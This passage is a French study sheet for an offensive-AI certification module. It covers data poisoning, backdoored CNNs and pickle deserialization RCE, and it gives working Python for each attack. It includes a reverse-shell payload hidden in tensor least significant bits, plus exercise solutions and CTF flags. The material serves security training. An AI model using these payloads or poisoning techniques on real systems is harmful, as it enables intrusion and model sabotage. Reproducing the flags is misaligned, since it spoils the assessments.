# AI Data Attacks (module 302) — Fiche de révision HTB Certified Offensive AI Expert

## En bref

Ce module est le module d'attaque **data-centric** central du cursus. Il exploite les vulnérabilités du **data pipeline** AI (collecte → stockage → traitement → modélisation → déploiement → monitoring/retraining) pour dégrader les perfs, forcer des misclassifications ciblées, ou obtenir une **RCE**. Cinq attaques concrètes à maîtriser, chacune avec un notebook et un flag :
1. **Label Flipping** (aléatoire) — dégradation générale ; fonction `flip_labels(y, poison_percentage)`. Exercice : poison **60 %**.
2. **Targeted Label Flipping** — misclassification d'une classe cible ; `targeted_flip_labels(...)` / stub `targeted_class_label_flip`. Exercice : **≥ 50 % de la classe 0 → classe 1**.
3. **Clean Label Attack** — on modifie **les features, pas les labels** ; perturbation de voisins Class 0 vers Class 1 (`NearestNeighbors`, `epsilon_cross`). Exercice : misclassifier Class 2 index 334 en Class 1.
4. **Trojan / Backdoor Attack** — trigger (carré magenta 4×4) sur GTSRB/MNIST, CNN PyTorch, mesuré par **ASR** (100 %). Exercice : MNIST, 7→1, trigger blanc en bas à gauche.
5. **Pickle / Deserialization RCE + Tensor Steganography** — `__reduce__` renvoie `(exec, (loader_code,))`, payload reverse shell caché dans les **LSB** d'un tenseur `float32`, chargé par `torch.load(..., weights_only=False)`. Flag via reverse shell dockerisé (`nc -lvnp 4444`).

Frameworks : **OWASP LLM03 (Training Data Poisoning)** couvre le poisoning ; **OWASP LLM05 (Supply Chain)** couvre les artefacts modèles trojanisés / désérialisation. **Google SAIF** : Secure Design, Data, Secure Supply Chain, Secure Deployment, Secure Monitoring & Response. SEED global partout = **1337**.

---

## 1. Panorama — Data pipeline AI et surface d'attaque

### Les 6 étapes du pipeline (et leurs technos)
| Étape | Rôle | Technos citées |
|---|---|---|
| **Data Collection** | tire les données brutes des sources | JSON logs via **Kafka**, **PostgreSQL**, IoT via **MQTT**, scrapers, batch tiers |
| **Storage** | stocke datasets + modèles sérialisés | **PostgreSQL** (structuré), **MongoDB** (NoSQL), **data lakes** (AWS S3), **InfluxDB** (time-series). Modèles : `.pkl`, `ONNX`, `.pt` |
| **Data Processing** | nettoyage, scaling, feature engineering | **Pandas**, **scikit-learn** imputers, **spaCy** (embeddings), **OpenCV**, **Apache Spark**, orchestration **Airflow** |
| **Modeling** | exploration + entraînement | **Jupyter**, **PyTorch**, **TensorFlow**, tuning **Optuna**, **SageMaker** |
| **Deployment** | modèle → système live | **FastAPI**/**Flask**, **Docker**, **Kubernetes**, serverless, edge |
| **Monitoring & Maintenance** | santé op + data drift + retraining | tracking latence/CTR, retraining orchestré (**Airflow**) |

### Mapping étape → attaque
- **Collection → Data Poisoning** : injection via les canaux déjà « de confiance » (faux reviews, DICOM/notes cliniques falsifiées). Techniques : **label flipping**, **feature attacks**, **backdoor triggers** (keywords).
- **Storage → tampering** : (1) accès non autorisé au data lake = poisoning « par une autre porte » (bypass validation d'ingestion) ; (2) remplacement des fichiers modèles `.pkl`/`.pt` par un **trojan** ou **model steganography** (code caché) — `pickle.load()` exécute le code embarqué.
- **Processing → manipulation de la logique** : compromettre le code de transformation corrompt des données propres à l'origine (le brut passe l'audit). Ex : job Spark de sentiment qui inverse les labels = label flipping sans toucher un seul review brut.
- **Modeling → dommage hérité** : le training loop apprend aveuglément ce que les données enseignent ; c'est là que la corruption devient un artefact entraîné.
- **Deployment → interception du fichier modèle** entre stockage et prod (CI/CD mal configuré, endpoint de pull non authentifié, MITM). Même risque Trojan/stego mais accès différent.
- **Monitoring/Retraining → online poisoning** : le pipeline **est conçu pour faire confiance aux nouvelles données**. Poisoning graduel (clickstream, feedback biaisé) ; difficile à détecter car indiscernable d'un vrai drift.

### Différence avec les autres familles
- **AI data attacks** : corrompent les données d'apprentissage **ou** l'artefact modèle stocké (agissent **avant** l'inférence).
- **Evasion attacks** : manipulent les inputs **à l'inférence** pour tromper un modèle déployé.
- **Privacy attacks** : extraient des infos mémorisées par le modèle.

### Frameworks de sécurité
- **OWASP Top 10 for LLM Apps** : `LLM03 Training Data Poisoning` (corruption en collection/processing/training/feedback — la majorité des attaques) ; `LLM05 Supply Chain Vulnerabilities` (sources tierces compromises, artefacts pré-entraînés altérés, dépendances/provenance/intégrité infra).
- **Google SAIF** (perspective cycle de vie) : `Secure Design`, protection `Data`, `Secure Supply Chain`, `Secure Deployment` (intégrité d'artefact + prévention injection code), `Secure Monitoring & Response` (détecter la manipulation dans les retraining loops — sécurité continue, pas un gate unique).

> 🎯 **Exam** — Sous quel item OWASP LLM tombe le data poisoning ? **LLM03**. Et le modèle trojanisé / désérialisation pickle ? **LLM05 (Supply Chain)**.

---

## 2. Label Flipping (attaque de base)

### Principe
La forme la plus simple de data poisoning. On cible la **ground truth** (les labels), **pas les features**. L'adversaire accède à une portion du dataset et inverse les labels de certains points (cat→dog, spam→not spam). But le plus courant : **degrade model performance** (baisse générale d'accuracy/precision/recall) — modèle « confus ». Ne vise pas des inputs précis. Relève de **OWASP LLM03**. Cible typiquement les données **après collecte** (stage Storage : colonnes label dans CSV sur S3, records PostgreSQL) ou via des scripts de Processing compromis.

Effet mathématique : le modèle minimise le **binary cross-entropy / log-loss** `L(w,b) = -1/N Σ [y_i log(p_i) + (1-y_i) log(1-p_i)]`. Flipper un label transforme le terme de perte d'un point (ex. pour un vrai Class 0 : de `-log(1-p_i)` petit vers `-log(p_i)` très grand quand p_i→0). Ce **large error signal** pousse la **decision boundary** loin de la position optimale.

### Scénario & dataset
Sentiment analysis binaire (Negative=Class 0, Positive=Class 1). Données synthétiques **`make_blobs`** 2D, modèle **`LogisticRegression`**. Baseline accuracy ≈ **0.9933**.

```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import make_blobs
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
import seaborn as sns

SEED = 1337
np.random.seed(SEED)

# Génération des données
n_samples = 1000
centers = [(0, 5), (5, 0)]          # deux blobs distincts
X, y = make_blobs(n_samples=n_samples, centers=centers, n_features=2,
                  cluster_std=1.25, random_state=SEED)
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=SEED)

# Baseline
baseline_model = LogisticRegression(random_state=SEED)
baseline_model.fit(X_train, y_train)
y_pred_baseline = baseline_model.predict(X_test)
baseline_accuracy = accuracy_score(y_test, y_pred_baseline)   # ~0.9933
```

### La fonction `flip_labels` (à implémenter — CODE EXACT)
Prend `y` et un `poison_percentage` (0–1), sélectionne aléatoirement (sans remise) `n_to_flip = int(n_samples * poison_percentage)` indices et inverse leurs labels (`1 - label`, ou `np.where`). Le RNG est seedé avec `SEED` pour la reproductibilité.

```python
def flip_labels(y, poison_percentage):
    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")

    n_samples = len(y)
    n_to_flip = int(n_samples * poison_percentage)

    if n_to_flip == 0:
        print("Warning: Poison percentage is 0 or too low to flip any labels.")
        return y.copy(), np.array([], dtype=int)

    # Sélection reproductible des indices
    rng_instance = np.random.default_rng(SEED)
    flipped_indices = rng_instance.choice(n_samples, size=n_to_flip, replace=False)

    # Flip effectif
    y_poisoned = y.copy()
    original_labels_at_flipped = y_poisoned[flipped_indices]
    y_poisoned[flipped_indices] = np.where(original_labels_at_flipped == 0, 1, 0)

    print(f"Flipping {n_to_flip} labels ({poison_percentage * 100:.1f}%).")
    return y_poisoned, flipped_indices
```

### Entraînement du modèle empoisonné (schéma clé)
On entraîne avec les **features originales `X_train`** mais les **labels empoisonnés**, puis on évalue **sur le test set propre** (`X_test`, `y_test`) — c'est le point crucial : mesurer l'effet sur des données légitimes non vues.

```python
y_train_poisoned_10, flipped_idx = flip_labels(y_train, 0.10)
model = LogisticRegression(random_state=SEED)
model.fit(X_train, y_train_poisoned_10)     # X original, y empoisonné
acc = accuracy_score(y_test, model.predict(X_test))   # toujours vs vrais labels
```

### Résultats & taux de poisoning
Taux testés : **0, 10, 20, 30, 40, 50 %**. Sur ces données très séparées, **pas de perte d'accuracy significative jusqu'à 50 %** (reste ≈ 0.9933) — MAIS la **decision boundary se décale constamment**. En conditions réelles (données bruitées), même un léger décalage causerait une perte. La boundary distordue s'accentue avec chaque palier.

### 🎯 Questions (section) — Exercice Label Flipping
- **id 3095** : « ... implement a label flipping attack in the provided `flip_labels` method stub to **poison 60% of the dataset**, train a model using the provided code, and submit the trained model to the docker instance using the last cell in the notebook. »
- **Flag** : `HTB{l4b3l_fl1pp1ng_pwnz_d3f4ult}`
- **Démarche** : compléter le stub `flip_labels` comme ci-dessus, appeler `flip_labels(y_train, 0.60)`, entraîner `LogisticRegression(random_state=SEED)` sur `X_train` + labels empoisonnés, exécuter la dernière cellule qui POST le modèle sérialisé à l'API docker → récupérer le flag. Poison = 60 % ⇒ `n_to_flip = int(len(y)*0.60)`.

---

## 3. Targeted Label Attack (label flipping ciblé)

### Principe
Variante focalisée : au lieu de dégrader globalement, on veut **misclassifier une classe cible** (ou instances précises). Stratégie : identifier les samples de la `target_class` et flipper une fraction de **seulement cette classe** vers `new_class`. Ici : rendre les vrais **positifs (Class 1) classés comme négatifs (Class 0)**.

Effet loss : pour un point vraiment Class 1 (p_j proche de 1), avec label flippé à 0, le terme devient `-log(1-p_j)` → **très grand** → gros gradient → la boundary se déplace pour classer davantage de la région Class 1 comme Class 0. Biais intentionnel et prévisible.

### La fonction `targeted_flip_labels` (CODE EXACT ; stub d'exercice = `targeted_class_label_flip`)
Logique : (1) trouver indices de `target_class` via `np.where`; (2) `n_to_flip = int(n_target_samples * poison_percentage)` (le % s'applique **uniquement au sous-ensemble de la classe cible**) ; (3) sélectionner aléatoirement dans `target_indices` ; (4) assigner `new_class`.

```python
def targeted_flip_labels(y, poison_percentage, target_class, new_class, seed=1337):
    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")
    if target_class == new_class:
        raise ValueError("target_class and new_class cannot be the same.")
    unique_labels = np.unique(y)
    if target_class not in unique_labels:
         raise ValueError(f"target_class ({target_class}) does not exist in y.")
    if new_class not in unique_labels:
         raise ValueError(f"new_class ({new_class}) does not exist in y.")

    target_indices = np.where(y == target_class)[0]
    n_target_samples = len(target_indices)
    if n_target_samples == 0:
        print(f"Warning: No samples found for target_class {target_class}. No labels flipped.")
        return y.copy(), np.array([], dtype=int)

    n_to_flip = int(n_target_samples * poison_percentage)
    if n_to_flip == 0:
        print(f"Warning: Poison percentage ({poison_percentage * 100:.1f}%) is too low "
              f"to flip any labels in the target class (size {n_target_samples}).")
        return y.copy(), np.array([], dtype=int)

    rng_instance = np.random.default_rng(seed)
    indices_within_target_set_to_flip = rng_instance.choice(
        n_target_samples, size=n_to_flip, replace=False)
    flipped_indices = target_indices[indices_within_target_set_to_flip]

    y_poisoned = y.copy()
    y_poisoned[flipped_indices] = new_class

    print(f"Targeting Class {target_class} for flipping to Class {new_class}.")
    print(f"Identified {n_target_samples} samples of Class {target_class}.")
    print(f"Attempting to flip {poison_percentage * 100:.1f}% ({n_to_flip} samples) of these.")
    print(f"Successfully flipped {len(flipped_indices)} labels.")
    return y_poisoned, flipped_indices
```

### Exécution démo (40 % de Class 1 → Class 0)
```python
poison_percentage_targeted = 0.40   # 40 %
target_class_to_flip = 1            # Class 1 (Positive)
new_label_for_flipped = 0          # → Class 0 (Negative)

y_train_targeted_poisoned, targeted_flipped_indices = targeted_flip_labels(
    y_train, poison_percentage_targeted, target_class_to_flip,
    new_label_for_flipped, seed=SEED)

targeted_poisoned_model = LogisticRegression(random_state=SEED)
targeted_poisoned_model.fit(X_train, y_train_targeted_poisoned)
```

### Résultats
- Accuracy chute de **0.9933 → 0.8100** sur le test propre.
- **Class 1 recall = 0.61** (seulement 61 % des vrais Class 1 identifiés).
- Confusion matrix : **57 False Negatives** (vrais Class 1 prédits Class 0), 0 False Positives Class 0.
- Sur données non vues (`cluster_std=1.50`, `unseen_seed = SEED + 1337`, 500 samples), les vrais Class 1 tombant du côté Class 0 de la boundary décalée sont misclassés.

### 🎯 Questions (section) — Exercice Targeted Label Flip
- **id 3033** : « ... implement a targeted label flipping attack in the provided `targeted_class_label_flip` method stub to **poison at least 50% of the class 0 labels as class 1** in the dataset ... submit the trained model ... »
- **Flag** : `HTB{l4b3l_fl1pp1ng_targeted_pwnz}`
- **Démarche** : compléter `targeted_class_label_flip` (même logique que `targeted_flip_labels`), appeler avec `target_class=0`, `new_class=1`, `poison_percentage=0.50` (⚠️ ici c'est **classe 0 → classe 1**, inverse de la démo qui faisait 1→0). Entraîner, POST le modèle → flag.

> 🎯 **Exam** — Dans targeted flip, le `poison_percentage` s'applique à quoi ? **Uniquement au nombre de samples de la target_class** (`n_target_samples`), pas au dataset total.

---

## 4. Clean Label Attack (attaque par features)

### Principe
Caractéristique déterminante : **ne modifie PAS les labels** ; l'adversaire **modifie les features** de quelques instances de façon à ce que le label original reste plausible. But hautement ciblé : faire misclassifier une **instance cible précise** à l'inférence. Plus furtif (pas de labels flippés) mais bien plus complexe à exécuter. Détection plus difficile que le simple label flipping.

Scénario : contrôle qualité 3 classes — Class 0 `Major Defect`, Class 1 `Acceptable`, Class 2 `Minor Defect`. On veut qu'une instance cible vraiment Class 1 soit classée Class 0. On perturbe des **voisins Class 0** proches de la cible pour qu'ils glissent dans la région Class 1 tout en gardant leur label 0 → le modèle, pour réconcilier, **pousse la boundary** dans la région Class 1, engloutissant la cible.

### Dataset & modèle
`make_blobs` **3 classes**, 1500 samples, `centers=[(0,6),(4,3),(8,6)]`, `cluster_std=1.15`, **StandardScaler**, split stratifié. Modèle = **`OneVsRestClassifier(LogisticRegression(C=1.0, solver="liblinear"))`**. Baseline accuracy ≈ **0.9600**.

```python
from sklearn.preprocessing import StandardScaler
from sklearn.neighbors import NearestNeighbors
from sklearn.multiclass import OneVsRestClassifier

SEED = 1337   # MUST BE 1337
X_3c, y_3c = make_blobs(n_samples=1500, centers=[(0,6),(4,3),(8,6)],
                        n_features=2, cluster_std=1.15, random_state=SEED)
scaler = StandardScaler(); X_3c_scaled = scaler.fit_transform(X_3c)
X_train_3c, X_test_3c, y_train_3c, y_test_3c = train_test_split(
    X_3c_scaled, y_3c, test_size=0.3, random_state=SEED, stratify=y_3c)

base_estimator = LogisticRegression(random_state=SEED, C=1.0, solver="liblinear")
baseline_model_3c = OneVsRestClassifier(base_estimator)
baseline_model_3c.fit(X_train_3c, y_train_3c)
```

### OvR : math clé
K classifieurs binaires ; score `z_k = w_k^T x + b_k` ; prédiction `argmax_k z_k`. Boundary 0-vs-1 : `f_01(x) = z_0 - z_1 = (w0-w1)^T x + (b0-b1) = 0`. Extraction des params : `baseline_model_3c.estimators_[k].coef_[0]` et `.intercept_[0]`.

### Étape A — sélection de la cible (le point Class 1 le plus proche de la boundary 0-vs-1)
On veut un vrai Class 1 (`y=1`) avec `f_01(x) < 0` (bien classé) mais **le plus proche de 0** (le max, càd la valeur négative la plus grande).

```python
w0_base = baseline_model_3c.estimators_[0].coef_[0]; b0_base = baseline_model_3c.estimators_[0].intercept_[0]
w1_base = baseline_model_3c.estimators_[1].coef_[0]; b1_base = baseline_model_3c.estimators_[1].intercept_[0]
w_diff_01_base = w0_base - w1_base
b_diff_01_base = b0_base - b1_base

class1_indices_train = np.where(y_train_3c == 1)[0]
X_class1_train = X_train_3c[class1_indices_train]
decision_values_01 = X_class1_train @ w_diff_01_base + b_diff_01_base   # f_01

on_correct = np.where(decision_values_01 < 0)[0]
target_point_index_relative = on_correct[np.argmax(decision_values_01[on_correct])]
target_point_index_absolute = class1_indices_train[target_point_index_relative]
X_target = X_train_3c[target_point_index_absolute]
y_target = y_train_3c[target_point_index_absolute]   # = 1
```
Résultat démo : cible = **index 373**, features `[-0.551, -0.367]`, `f_01 = -0.0493`.

### Étape B — voisins Class 0 à perturber (`NearestNeighbors`)
```python
n_neighbors_to_perturb = 5   # hyperparamètre
class0_indices_train = np.where(y_train_3c == 0)[0]
X_class0_train = X_train_3c[class0_indices_train]
nn_finder = NearestNeighbors(n_neighbors=n_neighbors_to_perturb, algorithm='auto')
nn_finder.fit(X_class0_train)
distances, indices_relative = nn_finder.kneighbors(X_target.reshape(1, -1))
neighbor_indices_absolute = class0_indices_train[indices_relative.flatten()]
X_neighbors = X_train_3c[neighbor_indices_absolute]
```
Démo : 5 voisins d'indices `[761, 82, 1035, 919, 491]`.

### Étape C — vecteur de perturbation
Direction = **opposée** au vecteur normal `v01 = (w0-w1)` (pour pousser Class 0 → Class 1), normalisée, échelonnée par `epsilon_cross = 0.25`.

```python
push_direction = -w_diff_01_base
unit_push_direction = push_direction / np.linalg.norm(push_direction)
epsilon_cross = 0.25
perturbation_vector = epsilon_cross * unit_push_direction
# démo : unit = [0.675, -0.738], delta = [0.169, -0.184]
```

### Étape D — application (features perturbées, LABEL INCHANGÉ = 0)
```python
X_train_poisoned = X_train_3c.copy()
y_train_poisoned = y_train_3c.copy()          # labels NON changés
for i, neighbor_idx in enumerate(neighbor_indices_absolute):
    X_train_poisoned[neighbor_idx] = X_neighbors[i] + perturbation_vector
    # y_train_poisoned[neighbor_idx] reste 0
```

### Résultats
Réentraînement (`OneVsRestClassifier` identique) sur données empoisonnées :
- **Cible index 373 : baseline prédit 1 → modèle empoisonné prédit 0** → SUCCÈS (misclassée en Class 0 sans aucun label modifié).
- Accuracy globale : **0.9600 → 0.9578** (drop 0.0022, « collateral damage » léger).

### 🎯 Questions (section) — Exercice Clean Label
- **id 3034** : « ... implement a clean label attack to **misclassify Class 2 Index 334 as Class 1**, train a model ... submit the trained model ... »
- **Flag** : `HTB{cl3an_l4b3l_fl4g_fun}`
- **Démarche** : adapter la logique (cible = index 334, vraie Class 2, à faire passer Class 1 ⇒ utiliser la boundary `f_21`/`f_12` = `(w2-w1)`) ; trouver les voisins **Class 1** proches de la cible, les perturber vers la région Class 2 en gardant leur label 1, ou inversement selon la direction voulue (pousser la boundary 1-vs-2 pour engloutir l'index 334). Entraîner OvR, POST modèle → flag.

> 🎯 **Exam** — Clean label vs label flip : la différence fondamentale ? Clean label **ne touche pas aux labels**, il perturbe **les features** en gardant le label plausible ; c'est furtif mais plus complexe.

---

## 5. Trojan / Backdoor Attack (trigger patterns, CNN)

### Principe
Combine **manipulation de features + corruption de labels**. On cache une logique malveillante dormante activée par un **trigger** discret (sticker, carré coloré). Sans trigger, le modèle est normal (furtivité maximale → détection très difficile). Exemple : lire un `Stop` comme `Speed limit 60`. Méthode : dupliquer des images source, y **embarquer le trigger**, les **relabelliser** vers la target ; entraîner sur le mélange → le réseau apprend sa tâche légitime ET la règle « si source + trigger → target ».

Objectif d'entraînement modifié (double tâche) :
`W*_trojan = argmin_W [ Σ_clean L(f(x_i;W), y_i) + Σ_source L(f(T(x_j);W), y_target) ]`
où `T(·)` applique le trigger et `y_target` est le label incorrect choisi.

### Dataset & config (GTSRB — démo)
**German Traffic Sign Recognition Benchmark**, 43 classes, images redimensionnées 48×48, normalisation ImageNet.
```python
IMG_SIZE = 48
IMG_MEAN = [0.485, 0.456, 0.406]; IMG_STD = [0.229, 0.224, 0.225]
SOURCE_CLASS = 14   # Stop
TARGET_CLASS = 3    # Speed limit 60km/h
POISON_RATE = 0.10  # 10 % des Stop signs du train empoisonnés
TRIGGER_SIZE = 4    # bloc 4x4
TRIGGER_POS = (IMG_SIZE - TRIGGER_SIZE - 1, IMG_SIZE - TRIGGER_SIZE - 1)  # coin bas-droit
TRIGGER_COLOR_VAL = (1.0, 0.0, 1.0)   # magenta (R,G,B dans [0,1])
```
SEED=1337 pour `random`, `numpy`, `torch` (+ CUDA). Device : CUDA / MPS / CPU.

### Architecture CNN `GTSRB_CNN`
3 conv + 2 pool + 2 FC + dropout(0.5). Feature size aplati = **18432** (= 128 × 12 × 12).
```python
class GTSRB_CNN(nn.Module):
    def __init__(self, num_classes=NUM_CLASSES_GTSRB):   # 43
        super().__init__()
        self.conv1 = nn.Conv2d(3, 32, kernel_size=3, padding=1)      # 48x48
        self.conv2 = nn.Conv2d(32, 64, kernel_size=3, padding=1)     # 48x48
        self.pool1 = nn.MaxPool2d(kernel_size=2, stride=2)           # ->24x24
        self.conv3 = nn.Conv2d(64, 128, kernel_size=3, padding=1)    # 24x24
        self.pool2 = nn.MaxPool2d(kernel_size=2, stride=2)           # ->12x12
        self._feature_size = 128 * 12 * 12                           # 18432
        self.fc1 = nn.Linear(self._feature_size, 512)
        self.fc2 = nn.Linear(512, num_classes)
        self.dropout = nn.Dropout(0.5)

    def forward(self, x):
        x = self.pool1(F.relu(self.conv2(F.relu(self.conv1(x)))))
        x = self.pool2(F.relu(self.conv3(x)))
        x = x.view(-1, self._feature_size)
        x = self.dropout(x)
        x = F.relu(self.fc1(x))
        x = self.dropout(x)
        x = self.fc2(x)
        return x
```

### `add_trigger` — insertion du trigger (CODE CLÉ)
Prend un tensor image (C×H×W en [0,1]), écrase un patch `TRIGGER_SIZE × TRIGGER_SIZE` à `TRIGGER_POS` avec la couleur du trigger.
```python
def add_trigger(image_tensor):
    c, h, w = image_tensor.shape
    start_x, start_y = TRIGGER_POS
    trigger_color_tensor = torch.tensor(
        TRIGGER_COLOR_VAL, dtype=image_tensor.dtype, device=image_tensor.device
    ).view(c, 1, 1)
    eff_start_y = max(0, min(start_y, h - 1)); eff_start_x = max(0, min(start_x, w - 1))
    eff_end_y = max(0, min(start_y + TRIGGER_SIZE, h)); eff_end_x = max(0, min(start_x + TRIGGER_SIZE, w))
    image_tensor[:, eff_start_y:eff_end_y, eff_start_x:eff_end_x] = trigger_color_tensor
    return image_tensor
```

### Datasets spécialisés
- **`PoisonedGTSRBTrain`** (entraînement) : sur les images `source_class`, en sélectionne `poison_rate` via `random.sample`, **change leur label en `target_class`** ET applique `add_trigger` dans `__getitem__`. Ordre des transforms : `base_transform` (Resize+ToTensor) → trigger (conditionnel) → `post_trigger_transform` (augmentation + normalisation) appliqué à TOUTES les images.
```python
# cœur de __getitem__
img_tensor = self.base_transform(img)              # -> [0,1]
if idx in self.poisoned_indices:
    img_tensor = self.trigger_func(img_tensor.clone())
img_tensor = self.post_trigger_transform(img_tensor)
return img_tensor, target_label                    # label = target_class si empoisonné
# sélection : num_to_poison = int(num_source_samples * poison_rate); random.sample(source_indices, num_to_poison)
```
- **`TriggeredGTSRBTestset`** (évaluation ASR) : applique `add_trigger` à **TOUTES** les images de test mais **garde les labels ORIGINAUX** (pour mesurer combien de Stop triggés sont prédits comme target). Transforms : base → trigger (toujours) → normalisation (sans augmentation).

### Hyperparamètres & training
```python
LEARNING_RATE = 0.001; NUM_EPOCHS = 20; WEIGHT_DECAY = 1e-4
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE, weight_decay=WEIGHT_DECAY)
# batch_size = 256 (train & test)
torch.save(model.state_dict(), "gtsrb_cnn_trojaned.pth")
```
Trade-offs : plus d'**epochs** → ASR ↑ mais CA (Clean Accuracy) peut ↓ ; **WEIGHT_DECAY** ↑ améliore CA/robustesse mais peut réduire l'ASR (supprime les poids nécessaires au trigger).

### Métrique ASR (Attack Success Rate)
`calculate_asr_gtsrb` : sur `testloader_triggered`, pour les images dont le **label original = source_class**, % prédit comme `target_class`.
```python
source_mask = labels == source_class
source_inputs = inputs[source_mask]
_, predicted = torch.max(model(source_inputs).data, 1)
total_source_class_triggered += source_inputs.size(0)
misclassified_as_target += (predicted == target_class).sum().item()
asr = 100 * misclassified_as_target / total_source_class_triggered
```

### Résultats démo
| Modèle | Clean Accuracy | ASR |
|---|---|---|
| Clean (baseline) | **97.92 %** | **0.00 %** (0/270) |
| Trojaned | **97.55 %** | **100.00 %** (270/270) |
Le trojan garde une CA quasi identique (furtivité) tout en atteignant **100 % ASR**.

### 🎯 Questions (section) — Exercice Trojan (MNIST)
- **id 3035** : « ... implement a trojan attack on the **MNIST** dataset, in a CNN (provided), that will **misclassify images of the number 7 as the number 1, when there is a white trigger placed in the bottom left** of the image ... submit the trained model ... »
- **Flag** : `HTB{mN15t_Tr0j4n_5ucc3s5fUl!}`
- **Démarche** : adapter `add_trigger` pour un carré **blanc** en **bas à gauche** (MNIST = 28×28 grayscale, 1 canal ⇒ valeur 1.0 ; position `start_x=0`, bas ⇒ y proche de H-taille). `SOURCE_CLASS=7`, `TARGET_CLASS=1`, appliquer poison sur une fraction des 7, entraîner le CNN fourni, POST → flag.

> 🎯 **Exam** — Sur quel sous-ensemble mesure-t-on l'ASR ? Les images **dont le label original = source_class**, toutes triggées, et on compte combien sont prédites = target_class. Le TriggeredTestset **conserve les labels originaux**.

---

## 6. Pickles & Tensor Steganography (Deserialization RCE)

### Pourquoi pickle = RCE
`pickle` sérialise/désérialise des objets Python. Danger : la méthode spéciale **`__reduce__`** — quand `pickle.load()` rencontre un objet qui la définit, il l'appelle pour savoir comment reconstruire l'objet ; ces instructions sont un **callable + arguments**. Un adversaire peut faire renvoyer par `__reduce__` un callable dangereux (`exec`, `os.system`) avec du code/commande → **exécution de code arbitraire** au chargement. Doc officielle : « The pickle module is not secure. Only unpickle data you trust. »

**PyTorch** : `torch.save(obj, path)` utilise pickle ; `torch.load(path)` utilise `pickle.load()` en interne → hérite du risque. Mitigation : **`weights_only=True`** (défaut dans les versions récentes) restreint à des types basiques (tensors, dict, list, tuple, str, nombres, None) et refuse d'exécuter `__reduce__`. **L'attaque cible `torch.load(path, weights_only=False)`** — mode où torch.load se comporte comme pickle.load et exécute le code embarqué.

### Tensor Steganography (LSB)
Le **state_dict** est l'ensemble des tenseurs de paramètres. On cache des données dans les **least significant bits (LSB)** des `float32` (IEEE 754) : modifier les LSB de la mantisse change à peine la valeur (impact minimal, furtif), alors que modifier les MSB corromprait le modèle. La stego sert de **porteuse de données** ; la désérialisation pickle fournit le **vecteur d'exécution**.

**Capacité** : `Capacity_bits = N × n` (N = `tensor.numel`, n = `num_lsb`) ; `Capacity_bytes = floor(N×n / 8)`. Ex. `SimpleNet.large_layer.weight` : N=20480, n=2 ⇒ 40960 bits = **5120 bytes (5 kB)**.

### Modèle cible `SimpleNet` (fournit un grand tenseur pour la charge)
```python
class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super().__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)  # cible stego (20480 elems)
    def forward(self, x):
        return self.fc2(self.relu(self.fc1(x)))   # large_layer non utilisé (simplicité)
torch.save(target_model.state_dict(), "target_model.pth")   # torch.save = pickle
```

### `encode_lsb` / `decode_lsb` (stego bit-level via `struct`)
Le préfixe de **longueur = 4 bytes big-endian** (`struct.pack(">I", data_len)`) est prepend au payload pour que le décodeur sache la taille.
```python
import struct
def encode_lsb(tensor_orig, data_bytes, num_lsb):
    if tensor_orig.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8. More bits increase distortion.")
    tensor = tensor_orig.clone().detach()
    tensor_flat = tensor.flatten(); n_elements = tensor.numel()
    data_to_embed = struct.pack(">I", len(data_bytes)) + data_bytes    # préfixe longueur
    total_bits_needed = len(data_to_embed) * 8
    if total_bits_needed > n_elements * num_lsb: raise ValueError("Tensor too small ...")
    data_iter = iter(data_to_embed); current_byte = next(data_iter, None)
    bit_index_in_byte = 7; element_index = 0; bits_embedded = 0
    while bits_embedded < total_bits_needed and element_index < n_elements:
        int_representation = struct.unpack(">I", struct.pack(">f", tensor_flat[element_index].item()))[0]
        mask = (1 << num_lsb) - 1; data_bits_for_float = 0
        for i in range(num_lsb):
            if current_byte is None: break
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:
                current_byte = next(data_iter, None); bit_index_in_byte = 7
            bits_embedded += 1
            if bits_embedded >= total_bits_needed: break
        new_int = (int_representation & (~mask)) | data_bits_for_float
        tensor_flat[element_index] = struct.unpack(">f", struct.pack(">I", new_int))[0]
        element_index += 1
    return tensor
```
`decode_lsb` : lit d'abord `get_bits(32)` → longueur, puis `get_bits(payload_len_bytes*8)` → reconstruit les bytes. Même `num_lsb` requis.

### Le payload — reverse shell
```python
HOST_IP = "localhost"   # TON IP sur le réseau HTB
LISTENER_PORT = 4444
payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
s.connect((attacker_ip, attacker_port)); s.settimeout(None)
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
shell = os.environ.get('SHELL', '/bin/bash')
pty.spawn([shell])
"""
payload_bytes_to_hide = payload_code_string.encode("utf-8")
```

### Embedding
```python
NUM_LSB = 2
loaded_state_dict = torch.load("victim_model_state.pth")   # weights_only=False implicite (ancien torch)
target_key = "large_layer.weight"
original_target_tensor = loaded_state_dict[target_key]
bytes_to_embed = 4 + len(payload_bytes_to_hide); bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB      # ceil
modified_target_tensor = encode_lsb(original_target_tensor, payload_bytes_to_hide, NUM_LSB)
modified_state_dict = loaded_state_dict.copy()
modified_state_dict[target_key] = modified_target_tensor
```

### Le déclencheur `TrojanModelWrapper.__reduce__` (LE CŒUR RCE)
